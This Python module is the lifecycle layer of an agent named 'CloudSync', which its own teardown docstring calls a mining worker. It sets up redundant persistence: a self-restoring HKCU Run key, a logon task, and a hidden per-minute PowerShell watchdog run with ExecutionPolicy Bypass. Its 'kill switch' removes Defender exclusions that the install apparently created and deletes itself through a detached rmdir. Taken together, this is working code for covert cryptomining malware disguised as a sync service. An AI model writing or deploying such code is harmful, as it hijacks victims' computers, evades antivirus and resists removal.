"""Lifecycle: make the install exist, and make it disappear.

This module owns every persistence and file side effect of the agent, so a
failure here has exactly one owner:

* :func:`ensure_run_key`  -- idempotent HKCU Run value (second persistence)
* :func:`register_tasks`  -- main ONLOGON task + ``CloudSyncHealth`` minute task
* :func:`bootstrap_legacy` -- adopt a pre-overhaul install with no ``install.json``
* :func:`cleanup_defender` -- remove ``*CloudSync*`` Defender exclusions
* :func:`teardown`        -- kill switch: worker -> tasks -> exclusions ->
  backup/install files -> detached ``rmdir``

Extracted from ``controller.py`` (``ensure_run_key`` 356-381,
``register_tasks`` 1031-1059, ``bootstrap_legacy`` 1062-1091,
``cleanup_defender`` 922-932, ``destroy`` 935-974) and
``supervisor.py::_teardown`` / ``_bootstrap_legacy`` (MIGRATION G1 + G3).

Windows work is delegated to :mod:`cloudsync.platform` (``tasks`` wrappers,
``winapi`` helpers) and the stdlib ``winreg`` module for the Run value; the only
subprocess here is the Defender PowerShell call, which mirrors the reference.
No syscalls are re-implemented. Every entry point accepts ``log=<callable|object|None>``
and is best effort: platform errors are logged, never raised. Nothing runs at
import time.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import time

from .core.state import atomic_write
from .platform import tasks, winapi

try:  # Windows-only; the helpers degrade to documented False elsewhere.
    import winreg
except ImportError:  # pragma: no cover - non-Windows development hosts
    winreg = None

__all__ = [
    "cleanup_defender",
    "register_tasks",
    "ensure_run_key",
    "bootstrap_legacy",
    "teardown",
]

DESTROY_FLAG = "destroy.flag"
RUN_KEY_SUBKEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
RUN_NAME = "CloudSync"
DEFAULT_IDLE_SECONDS = 180
ADOPTED_FROM = "legacy"

# Same command controller.cleanup_defender ran: only *CloudSync* matches are
# removed, so unrelated exclusions on the host are left alone.
_DEFENDER_SCRIPT = (
    "$p=Get-MpPreference;"
    "foreach($v in $p.ExclusionPath){if($v -like '*CloudSync*')"
    "{Remove-MpPreference -ExclusionPath $v -ErrorAction SilentlyContinue}};"
    "foreach($v in $p.ExclusionProcess){if($v -like '*CloudSync*')"
    "{Remove-MpPreference -ExclusionProcess $v -ErrorAction SilentlyContinue}}"
)

# Detached directory removal: pythonw still owns its own directory, so hand the
# rmdir to cmd.exe and let the process die (same trick as destroy()).
_RMDIR_SCRIPT = 'ping -n 4 127.0.0.1 >nul & rmdir /s /q "%s"'


# ---------------------------------------------------------------------------
# small helpers
# ---------------------------------------------------------------------------


def _resolve_log(log):
    """Return a callable accepting one message (no-op when *log* is None)."""
    if log is None:
        return lambda _message: None
    if callable(log):
        return log
    for name in ("log", "write", "info", "warning"):
        method = getattr(log, name, None)
        if callable(method):
            return method
    return lambda _message: None


def _interpreter(settings):
    """Program used to launch the controller: ``pythonw`` when known."""
    for name in ("pythonw", "python"):
        value = getattr(settings, name, "") or ""
        if value:
            return value
    return sys.executable or "pythonw.exe"


def _controller_arguments(settings):
    """Arguments for the controller entry point.

    A flat ``controller.py`` in the install directory wins: that is the legacy
    layout, and keeping it launches the exact file the updater hash-pins. New
    package installs use ``-m cloudsync`` (MIGRATION §2, G5).
    """
    legacy = settings.path("controller.py")
    if os.path.isfile(legacy):
        return (legacy,)
    return ("-m", "cloudsync")


def _launch_command(settings):
    """Return ``(program, argument tuple)`` for the controller."""
    return _interpreter(settings), _controller_arguments(settings)


def _quote_command(program, arguments):
    """Quote a command line for the Run value / task action."""
    parts = ['"%s"' % program]
    parts.extend('"%s"' % argument for argument in arguments)
    return " ".join(parts)


def _run_subkey(settings):
    """Registry subkey for ``install.json["run_key"]`` (HKCU form) with default."""
    raw = (getattr(settings, "run_key", "") or "").strip()
    for prefix in ("HKEY_CURRENT_USER\\", "HKCU:\\", "HKCU\\"):
        if raw.upper().startswith(prefix.upper()):
            raw = raw[len(prefix):]
            break
    return raw.strip("\\") or RUN_KEY_SUBKEY


def _run_name(settings):
    """Value name for the Run entry (``install.json["run_name"]`` wins)."""
    return (getattr(settings, "run_name", "") or "").strip() or RUN_NAME


def _install_dir(settings):
    """Absolute install directory, or ``""`` when the settings object lacks it."""
    return getattr(settings, "install_dir", "") or ""


def _task_names(settings):
    """Task names the install owns (main first, health second when present)."""
    names = getattr(settings, "tasks", ()) or ()
    return [str(name) for name in names if name]


def _watchdog_script(settings):
    """Path of ``watchdog.ps1`` when this install has one (probed by task setup)."""
    return settings.path("watchdog.ps1")


def _is_admin():
    """True when the current token is elevated (Defender removal needs it)."""
    try:
        return bool(winapi.is_admin())
    except Exception:
        return False


def _run_powershell(command, timeout=60):
    """Run a hidden PowerShell command; isolated for tests and error handling."""
    return subprocess.run(
        ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", command],
        timeout=timeout,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=winapi.creation_flags(),
    )


def _spawn_rmdir(path):
    """Delete *path* after this process exits (detached ``cmd /c``)."""
    flags = winapi.DETACHED_PROCESS | winapi.CREATE_NO_WINDOW
    subprocess.Popen(
        ["cmd.exe", "/c", _RMDIR_SCRIPT % path],
        creationflags=flags,
        close_fds=True,
    )


def _exit_now(code=0):
    """Hard-exit the controller. Kept as a module attribute so tests can replace it."""
    os._exit(code)


# ---------------------------------------------------------------------------
# "make it exist"
# ---------------------------------------------------------------------------


def ensure_run_key(settings, log=None):
    """Idempotent HKCU Run value so a deleted task still starts the controller.

    One registry read when the value is already correct (cheap enough to run
    every 10 minutes); rewritten and logged when it is missing or stale.
    Returns True when the value is correct after the call, False when the
    registry is unavailable (non-Windows / access denied).
    """
    write = _resolve_log(log)
    if winreg is None:
        write("run key unavailable: winreg not importable on this host")
        return False

    program, arguments = _launch_command(settings)
    name = _run_name(settings)
    subkey = _run_subkey(settings)
    wanted = _quote_command(program, arguments)

    key = None
    try:
        key = winreg.CreateKeyEx(
            winreg.HKEY_CURRENT_USER, subkey, 0, winreg.KEY_READ | winreg.KEY_WRITE
        )
        try:
            current, _kind = winreg.QueryValueEx(key, name)
        except FileNotFoundError:
            current = None
        if (current or "").strip() != wanted:
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, wanted)
            write("autostart Run key restored")
        return True
    except Exception as exc:
        write("run key check failed: %r" % (exc,))
        return False
    finally:
        if key is not None:
            try:
                winreg.CloseKey(key)
            except Exception:
                pass


def register_tasks(settings, log=None):
    """Create the main ONLOGON task and the ``CloudSyncHealth`` minute task.

    Task shape matches ``install-task.ps1`` / ``controller.register_tasks``:
    LIMITED, interactive (``/IT``), run as the current user, ``/F``. The health
    task is only created when ``watchdog.ps1`` is present. Returns True when the
    main task was created (and the health task was created or not applicable).
    """
    write = _resolve_log(log)
    names = _task_names(settings)
    if not names:
        write("no task names in settings - tasks not registered")
        return False

    program, arguments = _launch_command(settings)
    run_as = os.environ.get("USERNAME")
    main_ok = False
    try:
        main_ok = bool(tasks.create_onlogon(names[0], program, arguments, run_as=run_as))
    except Exception as exc:
        write("main task registration failed: %r" % (exc,))

    health_ok = True
    health_name = names[1] if len(names) > 1 else None
    watchdog = _watchdog_script(settings)
    if health_name and os.path.isfile(watchdog):
        try:
            health_ok = bool(
                tasks.create_minute(
                    health_name,
                    "powershell.exe",
                    ("-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy",
                     "Bypass", "-File", watchdog),
                    run_as=run_as,
                )
            )
        except Exception as exc:
            health_ok = False
            write("health task registration failed: %r" % (exc,))
    elif health_name:
        write("watchdog.ps1 missing - health task not registered")

    write("tasks registered: main=%s health=%s" % (main_ok, health_ok))
    return main_ok and health_ok


def bootstrap_legacy(settings, log=None):
    """Adopt a pre-overhaul install (no ``install.json``) and register tasks.

    Writes the same adoption record ``controller.bootstrap_legacy`` wrote and
    then registers the tasks; GPU profile provisioning stays with
    :mod:`cloudsync.platform.gpu` (the supervisor owns that step). Returns True
    when ``install.json`` exists after the call, False when adoption failed.
    """
    write = _resolve_log(log)
    install_path = settings.path("install.json")
    if os.path.isfile(install_path):
        return True

    write("no install.json - adopting legacy install at %s (binary=%s)"
          % (_install_dir(settings), getattr(settings, "binary", "") or "unknown"))

    info = {
        "install_dir": _install_dir(settings),
        "python": getattr(settings, "python", "") or "",
        "pythonw": getattr(settings, "pythonw", "") or "",
        "binary": getattr(settings, "binary", "") or "",
        "tasks": list(_task_names(settings)),
        "backup_dir": "",
        "idle_seconds": int(getattr(settings, "idle_seconds", DEFAULT_IDLE_SECONDS)
                            or DEFAULT_IDLE_SECONDS),
        "installed_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "adopted_from": ADOPTED_FROM,
    }
    try:
        atomic_write(install_path, json.dumps(info, indent=2))
    except Exception as exc:
        write("could not write install.json: %r" % (exc,))
        return False

    try:
        register_tasks(settings, write)
    except Exception as exc:
        write("task registration during adoption failed: %r" % (exc,))
    return True


# ---------------------------------------------------------------------------
# "make it go away"
# ---------------------------------------------------------------------------


def cleanup_defender(log=None):
    """Remove Defender path/process exclusions matching ``*CloudSync*``.

    No-op without elevation (the reference behaved the same way). Best effort:
    the exit of ``Remove-MpPreference`` is ignored and failures are only logged.
    """
    write = _resolve_log(log)
    if not _is_admin():
        write("defender cleanup skipped: not elevated")
        return
    try:
        _run_powershell(_DEFENDER_SCRIPT)
        write("defender exclusions removed")
    except Exception as exc:
        write("defender cleanup failed: %r" % (exc,))


def _stop_worker(worker, write):
    """Stop the worker when one was supplied; never let it block teardown."""
    if worker is None:
        return
    stop = getattr(worker, "stop", None)
    if not callable(stop):
        return
    try:
        stop()
    except Exception as exc:
        write("worker stop during teardown failed: %r" % (exc,))


def _delete_tasks(settings, write):
    """Delete both scheduled tasks; best effort."""
    names = _task_names(settings)
    if not names:
        return
    try:
        tasks.delete_all(names)
        write("tasks deleted: %s" % (", ".join(names),))
    except Exception as exc:
        write("task deletion failed: %r" % (exc,))


def _remove_tree(path, write):
    """Remove a directory tree, ignoring errors (backup shadow copy)."""
    if path and os.path.isdir(path):
        try:
            shutil.rmtree(path, ignore_errors=True)
            write("removed tree: %s" % (path,))
        except Exception as exc:
            write("could not remove %s: %r" % (path, exc))


def _remove_install_files(install_dir, write):
    """Delete every entry inside the install directory (files first, best effort)."""
    if not install_dir or not os.path.isdir(install_dir):
        return
    try:
        entries = os.listdir(install_dir)
    except OSError as exc:
        write("could not list install dir: %r" % (exc,))
        return
    for name in entries:
        try:
            os.remove(os.path.join(install_dir, name))
        except OSError:
            pass
    write("install files removed: %d entrie(s)" % (len(entries),))


def teardown(settings, worker=None, log=None):
    """Kill switch: stop mining, remove persistence, delete the install tree.

    Ordered exactly like ``controller.destroy``: worker -> tasks -> Defender
    exclusions -> backup/install files -> detached ``rmdir`` -> hard exit. Every
    step is best effort; the function never raises and never returns in
    production (``_exit_now`` ends the process).
    """
    write = _resolve_log(log)
    write("DESTROY requested")

    flag = settings.path(DESTROY_FLAG)
    try:
        atomic_write(flag, "1")
    except Exception as exc:
        write("could not write destroy.flag: %r" % (exc,))

    _stop_worker(worker, write)
    _delete_tasks(settings, write)
    cleanup_defender(write)
    _remove_tree(getattr(settings, "backup_dir", "") or "", write)
    install_dir = _install_dir(settings)
    _remove_install_files(install_dir, write)

    if install_dir:
        try:
            _spawn_rmdir(install_dir)
        except Exception as exc:
            write("detached rmdir failed: %r" % (exc,))

    write("teardown complete - exiting")
    _exit_now(0)
